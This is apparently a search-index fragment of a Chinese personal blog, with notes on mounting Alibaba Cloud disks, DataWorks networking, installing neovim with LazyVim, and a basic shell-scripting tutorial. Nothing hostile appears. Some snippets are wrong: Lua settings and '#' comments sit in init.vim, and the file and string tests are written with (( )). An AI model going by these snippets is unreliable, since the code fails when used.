","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:5:1","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#扩容"},{"categories":["blog"],"content":" 新加硬盘 实例页面购买多个云盘, 勾选挂载到实例 官网初始化文档操作 # 看到/dev/vdb /dev/vdc等等硬盘 fdisk -lu # 推荐使用 gpt 分区 apt install parted -y parted /dev/vdb mklabel gpt mkpart primary 1 100% align-check optimal 1 # 退出交互 quit # 验证 partprobe fdisk -lu /dev/vdb # 显示gpt # 文件系统 apt install e2fsprogs -y mkfs -t ext4 /dev/vdb1 # 挂载 cp /etc/fstab /etc/fstab.bak mkdir /mnt/vdb1 # /dev/vdb1 /mnt/vdb1 echo `blkid /dev/vdb1 | awk '{print $2}' | sed 's/\\\"//g'` /mnt/vdb1 ext4 defaults 0 0 \u003e\u003e /etc/fstab ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:5:2","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#新加硬盘"},{"categories":["blog"],"content":" dataworks 网络排查排查步骤： 需要检查配置信息是否正确无误 数据源和 dataworks 需要在同地域，然后通过如下方式打通网络 具体操作 专有网络绑定—- 新增绑定：填写专有网络、交换机、安全组 https://help.aliyun.com/document_detail/137838.html?spm=a2c4g.11186623.6.736.460020989baWXL#title-y2t-d8r-10z 注：如果 vpc 选择后选不了对应的交换机，说明不在同一个可用区，需要添加路由 添加路由 https://help.aliyun.com/document_detail/168984.html?spm=a2c4g.11186623.6.687.49804074hT07LA#title-cy5-ynr-v79 添加白名单 添加资源组的 EIP 和弹性网卡 ip 至数据库白名单 https://help.aliyun.com/document_detail/137792.html?spm=a2c4g.11186623.6.688.4da96a10i6tu8V ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/:6:0","series":null,"tags":["blog"],"title":"阿里云操作","uri":"/posts/%E7%AC%94%E8%AE%B0/%E9%98%BF%E9%87%8C%E4%BA%91%E6%93%8D%E4%BD%9C/#dataworks-网络排查"},{"categories":["point"],"content":"neovim 是一个编辑器. 要点: 免费 流行 功能很强大 ","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/neovim/:0:0","series":null,"tags":["point","neovim"],"title":"neovim","uri":"/posts/%E7%AC%94%E8%AE%B0/point/neovim/#"},{"categories":["blog"],"content":"我在 [[笔记/point/linux|linux]] 下编辑文件都会使用 [[笔记/neovim教程|neovim教程]] .记录一些配置和功能.","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介我在 linux 下编辑文件都会使用 neovim教程 .记录一些配置和功能. ","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#内容"},{"categories":["blog"],"content":" 安装 Windows 安装 clang,参考微软文档 Clang/LLVM support 进入 visual studio install 安装好 clang,然后进入系统开始菜单的 x64 Native Tools Command Prompt 命令行终端, clang -v 查看安装的位置. 加入到系统变量中 安装 winget install Neovim.Neovim 执行下面的 shell # 去除现有内容 rm $env:LOCALAPPDATA/nvim rm $env:LOCALAPPDATA/nvim-data # 克隆配置 git clone https://github.com/LazyVim/starter $env:LOCALAPPDATA/nvim # 删除git,后面可以加上自己的git rm $env:LOCALAPPDATA/nvim/.git # 启动!! # 最好默认有翻墙了,因为需要取境外拉取内容 nvim Linux 下载 nvim-linux64.tar.gz,并加入到环境变量 Path 中. echo \"PATH=\\$PATH:/root/nvim-linux64/bin\" \u003e\u003e ~/.bashrc 安装依赖 apt install libfuse2 build-essential -y 执行下面 shell # 去除现有内容 mv ~/.config/nvim{,.bak} mv ~/.local/share/nvim{,.bak} mv ~/.local/state/nvim{,.bak} mv ~/.cache/nvim{,.bak} # 克隆配置 # git clone https://ghproxy.com/https://github.com/LazyVim/starter ~/.config/nvim git clone https://github.com/LazyVim/starter ~/.config/nvim # 删除git,后面可以加上自己的git rm -rf ~/.config/nvim/.git # 启动!! # 最好默认有翻墙了,因为需要取境外拉取内容 nvim ","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 安装 Windows 安装 clang,参考微软文档 Clang/LLVM support 进入 visual studio install 安装好 clang,然后进入系统开始菜单的 x64 Native Tools Command Prompt 命令行终端, clang -v 查看安装的位置. 加入到系统变量中 安装 winget install Neovim.Neovim 执行下面的 shell # 去除现有内容 rm $env:LOCALAPPDATA/nvim rm $env:LOCALAPPDATA/nvim-data # 克隆配置 git clone https://github.com/LazyVim/starter $env:LOCALAPPDATA/nvim # 删除git,后面可以加上自己的git rm $env:LOCALAPPDATA/nvim/.git # 启动!! # 最好默认有翻墙了,因为需要取境外拉取内容 nvim Linux 下载 nvim-linux64.tar.gz,并加入到环境变量 Path 中. echo \"PATH=\\$PATH:/root/nvim-linux64/bin\" \u003e\u003e ~/.bashrc 安装依赖 apt install libfuse2 build-essential -y 执行下面 shell # 去除现有内容 mv ~/.config/nvim{,.bak} mv ~/.local/share/nvim{,.bak} mv ~/.local/state/nvim{,.bak} mv ~/.cache/nvim{,.bak} # 克隆配置 # git clone https://ghproxy.com/https://github.com/LazyVim/starter ~/.config/nvim git clone https://github.com/LazyVim/starter ~/.config/nvim # 删除git,后面可以加上自己的git rm -rf ~/.config/nvim/.git # 启动!! # 最好默认有翻墙了,因为需要取境外拉取内容 nvim ","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#windows"},{"categories":["blog"],"content":" 安装 Windows 安装 clang,参考微软文档 Clang/LLVM support 进入 visual studio install 安装好 clang,然后进入系统开始菜单的 x64 Native Tools Command Prompt 命令行终端, clang -v 查看安装的位置. 加入到系统变量中 安装 winget install Neovim.Neovim 执行下面的 shell # 去除现有内容 rm $env:LOCALAPPDATA/nvim rm $env:LOCALAPPDATA/nvim-data # 克隆配置 git clone https://github.com/LazyVim/starter $env:LOCALAPPDATA/nvim # 删除git,后面可以加上自己的git rm $env:LOCALAPPDATA/nvim/.git # 启动!! # 最好默认有翻墙了,因为需要取境外拉取内容 nvim Linux 下载 nvim-linux64.tar.gz,并加入到环境变量 Path 中. echo \"PATH=\\$PATH:/root/nvim-linux64/bin\" \u003e\u003e ~/.bashrc 安装依赖 apt install libfuse2 build-essential -y 执行下面 shell # 去除现有内容 mv ~/.config/nvim{,.bak} mv ~/.local/share/nvim{,.bak} mv ~/.local/state/nvim{,.bak} mv ~/.cache/nvim{,.bak} # 克隆配置 # git clone https://ghproxy.com/https://github.com/LazyVim/starter ~/.config/nvim git clone https://github.com/LazyVim/starter ~/.config/nvim # 删除git,后面可以加上自己的git rm -rf ~/.config/nvim/.git # 启动!! # 最好默认有翻墙了,因为需要取境外拉取内容 nvim ","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#linux"},{"categories":["blog"],"content":" 配置文件 windows 配置文件路径 ~/AppData/Local/nvim linux 配置文件路径 ~/.config/nvim ","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#配置文件"},{"categories":["blog"],"content":" 基础配置 # 安装和进入创建配置文件 apt install neovim -y echo \"alias vim='nvim'\" \u003e\u003e ~/.bashrc echo \"alias vimrc='nvim ~/.config/nvim/init.vim'\" \u003e\u003e ~/.bashrc source ~/.bashrc mkdir -p ~/.config/nvim cd ~/.config/nvim 配置文件 vim ~/.config/nvim/init.vim # 显示行数 vim.opt.number=true # 制表符转换为空格 set expandtab # tab长度4个空格 set tabstop=4 # 进行缩进的时候,缩进长度 set shiftwidth=4 ","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#基础配置"},{"categories":["blog"],"content":" 问题处理","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#问题处理"},{"categories":["blog"],"content":" 报错 lazy 无法找到报错 module 'lazy' not found. 因为需要拉取外网内容, 所以需要 clash 等代理配置. 配置好代理后删除 lazy 目录重新进入即可. rm -rf ~/.local/share/nvim/lazy 删除 LOCALDATA/nvim-data/lazy ","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#报错-lazy-无法找到"},{"categories":["blog"],"content":" 参考#todo/笔记 对比 GitHub - folke/lazy.nvim: 💤 A modern plugin manager for Neovim 和 packer. Vim 可能用得上的配置 \" 以双引号开头的是注释 \" 不与 Vi 兼容（采用 Vim 自己的操作命令） set nocompatible \" 打开语法高亮 syntax on \" 底部显示当前模式 set showmode \" 命令模式下显示键入的指令 set showcmd \" 支持鼠标 set mouse=a \" 设置字符编码 set encoding=utf-8 \" 启动256色 set t_Co=256 \" 开启文件检测，使用对应规则 filetype indent on \" 下一行与上一行保持缩进 set autoindent \" tab的空格数 set tabstop=4 \" 加减缩进 \" \u003c\u003c减缩进，\u003e\u003e加缩进，==去除所有缩进 set shiftwidth=4 \" tab转空格 set expandtab \" 显示行号 set number \" 显示当前行号，其他是对应行号 \" set relativenumber \" 行宽 set textwidth=80 \" 自动折行 set wrap \" 指定符号比如空格什么的才折行 set linebreak \" 显示状态栏 set laststatus=2 \" 括号自动高亮匹配 set showmatch \" 高亮显示搜索的匹配结果 set hlsearch \" 每输入一个字就跳到匹配位置 set incsearch \" 搜索忽略大小写 set ignorecase \" 智能匹配，开启上面的话小写可以匹配大写，大写不匹配小写 set smartcase \" 检查英语拼写 \" set spell spelllang=en_us \" 不备份，默认会有个~结尾备份文件 set nobackup \" 不创建系统崩溃时候的恢复文件 set noswapfile \" 即使退出也会有undo~的可撤销文件，让你可以撤销上次的操作 set undofile \" 打开多个文件的时候自动切换目录 set autochdir \" 报错不发出声音 \" set noerrorbells \" 报错闪烁 \" set visualbell \" 显示行位空格 \" set listchars=tab:»■,trail:■ \" set list \" 第一次tab补全，第二次选择 \" set wildmenu \" set wildmode=longest:list,full \" 自动重新加载 set autoread \" 正则魔术 \" set magic \" 修改终端标题 \" set title ","date":"2023-08-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["neovim","blog"],"title":"neovim教程","uri":"/posts/%E7%AC%94%E8%AE%B0/neovim%E6%95%99%E7%A8%8B/#参考"},{"categories":["point"],"content":"shell 是一种命令程序语言, 是操作系统和用户之间的接口. 要点: linux 通常默认使用 bash sh 全称 Bourne Shell, 而 bash 全称 Bourne-Again Shell 有变量, 条件, 循环, 函数, 管道, 重定向等等.. 有很多变种, 例如 ksb, csh, zsh ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/shell/:0:0","series":null,"tags":["point","shell"],"title":"shell","uri":"/posts/%E7%AC%94%E8%AE%B0/point/shell/#"},{"categories":["blog"],"content":"虽然我不喜欢写 [[笔记/point/shell|shell]],但其实 [[笔记/point/shell|shell]] 是高效的.","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介虽然我不喜欢写 shell,但其实 shell 是高效的. 这里记录一些用法和技巧. ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 常用内容","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#常用内容"},{"categories":["blog"],"content":" 一行命令 # 循环ssh不同机器执行命令 for i in {12..17};do ssh root@l0.0.0.si \"ifconfig grep -Al flannel.1\";done # 也可以用 for i in item1 item2 ... itemN; ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#一行命令"},{"categories":["blog"],"content":" 基础 变量 # 变量,优先使用双引号(可以有变量,转移字符) a=\"a1\" # 拼接 greeting_1=\"hello, ${a} !\" # 相等 $a == ${a} # 长度 ${#a} # 从位置0开始截取长度1 ${a:0:1} # 只读 readonly a # 删除变量 unset a 数组 array_name=(value0 value1 value2 value3) array_name[0]=value0 array_name[1]=value1 array_name[n]=valuen # 取值必须用${}包围 # 取得数组元素的个数,也可以length=${#array_name[@]} length=${#array_name[*]} # 单个元素 lengthn=${#array_name[n]} # 键值对就是自己设置下标,其他使用完全一致 declare -A site site[\"google\"]=\"www.google.com\" site[\"runoob\"]=\"www.runoob.com\" site[\"taobao\"]=\"www.taobao.com\" echo ${site[\"runoob\"]} 参数 echo \"执行的文件名: $0\"; echo \"第一个参数为: $1\"; echo \"第二个参数为: $2\"; echo \"第三个参数为: $3\"; echo \"参数个数: $#\"; echo \"进程号: $$\"; echo \"演示\\$*\" for i in \"$*\"; do echo $i done; echo \"演示\\$@\" for var in \"$@\"; do echo $var done; echo \"执行的文件名: $0\"; echo \"第一个参数为: $1\"; echo \"第二个参数为: $2\"; echo \"第三个参数为: $3\"; echo \"参数个数: $#\"; echo \"进程号: $$\"; echo \"演示\\$*\" for i in \"$*\"; do echo $i done; echo \"演示\\$@\" for var in \"$@\"; do echo $var done; echo \"退出码 $?\" ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#基础"},{"categories":["blog"],"content":" 基础 变量 # 变量,优先使用双引号(可以有变量,转移字符) a=\"a1\" # 拼接 greeting_1=\"hello, ${a} !\" # 相等 $a == ${a} # 长度 ${#a} # 从位置0开始截取长度1 ${a:0:1} # 只读 readonly a # 删除变量 unset a 数组 array_name=(value0 value1 value2 value3) array_name[0]=value0 array_name[1]=value1 array_name[n]=valuen # 取值必须用${}包围 # 取得数组元素的个数,也可以length=${#array_name[@]} length=${#array_name[*]} # 单个元素 lengthn=${#array_name[n]} # 键值对就是自己设置下标,其他使用完全一致 declare -A site site[\"google\"]=\"www.google.com\" site[\"runoob\"]=\"www.runoob.com\" site[\"taobao\"]=\"www.taobao.com\" echo ${site[\"runoob\"]} 参数 echo \"执行的文件名: $0\"; echo \"第一个参数为: $1\"; echo \"第二个参数为: $2\"; echo \"第三个参数为: $3\"; echo \"参数个数: $#\"; echo \"进程号: $$\"; echo \"演示\\$*\" for i in \"$*\"; do echo $i done; echo \"演示\\$@\" for var in \"$@\"; do echo $var done; echo \"执行的文件名: $0\"; echo \"第一个参数为: $1\"; echo \"第二个参数为: $2\"; echo \"第三个参数为: $3\"; echo \"参数个数: $#\"; echo \"进程号: $$\"; echo \"演示\\$*\" for i in \"$*\"; do echo $i done; echo \"演示\\$@\" for var in \"$@\"; do echo $var done; echo \"退出码 $?\" ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#变量"},{"categories":["blog"],"content":" 基础 变量 # 变量,优先使用双引号(可以有变量,转移字符) a=\"a1\" # 拼接 greeting_1=\"hello, ${a} !\" # 相等 $a == ${a} # 长度 ${#a} # 从位置0开始截取长度1 ${a:0:1} # 只读 readonly a # 删除变量 unset a 数组 array_name=(value0 value1 value2 value3) array_name[0]=value0 array_name[1]=value1 array_name[n]=valuen # 取值必须用${}包围 # 取得数组元素的个数,也可以length=${#array_name[@]} length=${#array_name[*]} # 单个元素 lengthn=${#array_name[n]} # 键值对就是自己设置下标,其他使用完全一致 declare -A site site[\"google\"]=\"www.google.com\" site[\"runoob\"]=\"www.runoob.com\" site[\"taobao\"]=\"www.taobao.com\" echo ${site[\"runoob\"]} 参数 echo \"执行的文件名: $0\"; echo \"第一个参数为: $1\"; echo \"第二个参数为: $2\"; echo \"第三个参数为: $3\"; echo \"参数个数: $#\"; echo \"进程号: $$\"; echo \"演示\\$*\" for i in \"$*\"; do echo $i done; echo \"演示\\$@\" for var in \"$@\"; do echo $var done; echo \"执行的文件名: $0\"; echo \"第一个参数为: $1\"; echo \"第二个参数为: $2\"; echo \"第三个参数为: $3\"; echo \"参数个数: $#\"; echo \"进程号: $$\"; echo \"演示\\$*\" for i in \"$*\"; do echo $i done; echo \"演示\\$@\" for var in \"$@\"; do echo $var done; echo \"退出码 $?\" ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#数组"},{"categories":["blog"],"content":" 基础 变量 # 变量,优先使用双引号(可以有变量,转移字符) a=\"a1\" # 拼接 greeting_1=\"hello, ${a} !\" # 相等 $a == ${a} # 长度 ${#a} # 从位置0开始截取长度1 ${a:0:1} # 只读 readonly a # 删除变量 unset a 数组 array_name=(value0 value1 value2 value3) array_name[0]=value0 array_name[1]=value1 array_name[n]=valuen # 取值必须用${}包围 # 取得数组元素的个数,也可以length=${#array_name[@]} length=${#array_name[*]} # 单个元素 lengthn=${#array_name[n]} # 键值对就是自己设置下标,其他使用完全一致 declare -A site site[\"google\"]=\"www.google.com\" site[\"runoob\"]=\"www.runoob.com\" site[\"taobao\"]=\"www.taobao.com\" echo ${site[\"runoob\"]} 参数 echo \"执行的文件名: $0\"; echo \"第一个参数为: $1\"; echo \"第二个参数为: $2\"; echo \"第三个参数为: $3\"; echo \"参数个数: $#\"; echo \"进程号: $$\"; echo \"演示\\$*\" for i in \"$*\"; do echo $i done; echo \"演示\\$@\" for var in \"$@\"; do echo $var done; echo \"执行的文件名: $0\"; echo \"第一个参数为: $1\"; echo \"第二个参数为: $2\"; echo \"第三个参数为: $3\"; echo \"参数个数: $#\"; echo \"进程号: $$\"; echo \"演示\\$*\" for i in \"$*\"; do echo $i done; echo \"演示\\$@\" for var in \"$@\"; do echo $var done; echo \"退出码 $?\" ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#参数"},{"categories":["blog"],"content":" If 语法 if condition1; then command1; elif condition2; then command2; else commandN; fi ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#if-语法"},{"categories":["blog"],"content":" case-when 分支 case 值 in 模式1) command1 command2 ... commandN ;; 模式2) command1 command2 ... commandN ;; esac # 示例 echo '输入 1 到 4 之间的数字:' echo '你输入的数字为:' read aNum case $aNum in 1) echo '你选择了 1' ;; 2) echo '你选择了 2' ;; 3) echo '你选择了 3' ;; 4) echo '你选择了 4' ;; *) echo '你没有输入 1 到 4 之间的数字' ;; esac ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:4","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#case-when-分支"},{"categories":["blog"],"content":" 循环break 和 continue 可以跳出和继续循环. for 循环 for var in item1 item2 ... itemN do command1 command2 ... commandN done # 高级用法 # for file in $(ls /etc) for file in `ls /etc` do head -n 1 $file done while 循环 while condition do command done # 循环5次 int=1 while(( $int\u003c=5 )) do echo $int let \"int++\" done 无限循环 # 1 while : do command done # 2 while true do command done # 3 for (( ; ; )) ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#循环"},{"categories":["blog"],"content":" 循环break 和 continue 可以跳出和继续循环. for 循环 for var in item1 item2 ... itemN do command1 command2 ... commandN done # 高级用法 # for file in $(ls /etc) for file in `ls /etc` do head -n 1 $file done while 循环 while condition do command done # 循环5次 int=1 while(( $int\u003c=5 )) do echo $int let \"int++\" done 无限循环 # 1 while : do command done # 2 while true do command done # 3 for (( ; ; )) ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#for-循环"},{"categories":["blog"],"content":" 循环break 和 continue 可以跳出和继续循环. for 循环 for var in item1 item2 ... itemN do command1 command2 ... commandN done # 高级用法 # for file in $(ls /etc) for file in `ls /etc` do head -n 1 $file done while 循环 while condition do command done # 循环5次 int=1 while(( $int\u003c=5 )) do echo $int let \"int++\" done 无限循环 # 1 while : do command done # 2 while true do command done # 3 for (( ; ; )) ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#while-循环"},{"categories":["blog"],"content":" 循环break 和 continue 可以跳出和继续循环. for 循环 for var in item1 item2 ... itemN do command1 command2 ... commandN done # 高级用法 # for file in $(ls /etc) for file in `ls /etc` do head -n 1 $file done while 循环 while condition do command done # 循环5次 int=1 while(( $int\u003c=5 )) do echo $int let \"int++\" done 无限循环 # 1 while : do command done # 2 while true do command done # 3 for (( ; ; )) ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#无限循环"},{"categories":["blog"],"content":" 计算 val1=`expr 2 + 2` # 乘法必须转义 val2=`expr 2 \\* 2` ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:6","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#计算"},{"categories":["blog"],"content":" 函数 funWithParam(){ echo \"第一个参数为 $1 !\" echo \"第二个参数为 $2 !\" echo \"第十个参数为 $10 !\" echo \"第十个参数为 ${10} !\" echo \"第十一个参数为 ${11} !\" echo \"参数总数有 $# 个!\" echo \"作为一个字符串输出所有参数 $* !\" } funWithParam 1 2 3 4 5 6 7 8 9 34 73 ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:7","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#函数"},{"categories":["blog"],"content":" 重定向 # \u003e 覆盖写入文件, \u003e\u003e 追加到文件 # /dev/null可以丢弃 touch 1.txt # stdout输出到1.txt,stderr显示到屏幕 ls 1.txt 2.txt \u003e 1.txt # stdout输出到1.txt,stderr输出到2.txt ls 1.txt 3.txt \u003e 1.txt 2\u003e2.txt # 注意!!! 2\u003e\u00261永远不变, 而\u003e1.txt或者\u003e\u003e1.txt决定覆盖或者追加 # stdout和stderr都输出到1.txt ls 1.txt 2.txt \u003e1.txt 2\u003e\u00261 # 新版本写法,crontab就不兼容..建议不用 ls 1.txt 2.txt \u0026\u003e1.txt ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:8","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#重定向"},{"categories":["blog"],"content":" 包含外部 shell 文件 #使用 . 号来引用test1.sh 文件 . ./test1.sh # 或者使用以下包含文件代码 source ./test1.sh ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:2:9","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#包含外部-shell-文件"},{"categories":["blog"],"content":" 拓展内容","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#拓展内容"},{"categories":["blog"],"content":" 条件判断 # $memory_usage默认字符串,所以无法比较 if (( $(echo \"$memory_usage \u003e 1\" | bc -l) )) ; then echo \"2\" fi # 检测字符串长度是否为0，为0返回 true if (( -z $a )) # 检测字符串长度是否不为 0，不为 0 返回 true if (( -n $a )) # 字符串不为空,返回true if (( $a )) file=\"/tmp/1.txt\" # 是目录,返回true if (( -d $a )) # 是文件,返回true if (( -f $a )) # 存在,返回true if (( -e $a )) # 文件大小大于0 if (( -s $a )) ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#条件判断"},{"categories":["blog"],"content":" 调试/报错 # 开启调试.可以看到变量值和执行命令情况 set -x # 出错就停止返回非0 set -e ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:3:2","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#调试报错"},{"categories":["blog"],"content":" 行匹配 awk # 使用正则/Mem/匹配某一行. # 默认是空格分隔,可以 -F ',' 指定逗号分隔 # 第三个字段/第二个字段*100,取2位余数 free | awk '/Mem/{printf(\"%.2f\"), $3/$2 * 100}' ","date":"2023-08-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/:3:3","series":null,"tags":["blog","shell"],"title":"shell教程","uri":"/posts/%E7%AC%94%E8%AE%B0/shell%E6%95%99%E7%A8%8B/#行匹配-awk"},{"categories":["blog"],"content":" 循环 seq+ 打印 printf # seq 100 生成序列 # 输出的时候 .0 去掉了序列里的值,所以只会输出井号 echo `printf '#%.0s' $(seq 100)` 